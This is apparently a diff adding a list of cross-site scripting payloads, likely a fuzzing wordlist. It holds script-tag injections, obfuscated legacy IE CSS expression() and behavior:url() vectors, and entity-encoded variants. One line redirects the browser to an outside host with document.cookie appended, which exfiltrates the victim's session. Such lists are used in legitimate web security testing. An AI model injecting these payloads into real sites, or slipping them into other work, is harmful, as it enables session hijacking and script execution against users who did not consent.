+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:confirm();</html:script></html:html>
+'';!--"<XSS>=&{()}
+';';;!--";<;XSS>;=&;{()}
+xss&#58;ex&#x2F;*XSS*//*/*/pression(confirm(\"XSS\"))'&gt;
+xss:ex/*XSS*//*/*/pression(confirm(1))'>
+xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
+<XSS STYLE="behavior: url(%(htc)s);">
+<;XSS STYLE=";behavior: url(http://www.google.com/xss.htc);";>;
+<XSS STYLE="behavior: url(xss.htc);">
+</XSS STYLE=xss:expression(confirm())>
+</XSS/*-*/STYLE=xss:e/**/xpression(confirm())>
+<~/XSS STYLE=xss:expression(confirm())>
+<~/XSS/*-*/STYLE=xss:e/**/xpression(confirm())>
+<XSS STYLE="xss:expression(confirm())">
+XSS STYLE=xss:e/**/xpression(confirm())>
+XSS/*-*/STYLE=xss:e/**/xpression(confirm())>
+<;XSS STYLE=";xss:expression(confirm(';XSS';))";>;
+<XSS STYLE="xss:expression(document.vulnerable=true)">
+<XSS STYLE="xss:expression(javascript:confirm())">
+<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.google.com/?sid="%2bdocument.cookie)>
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<x style="behavior:url(%(sct)s)">
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:confirm()` >
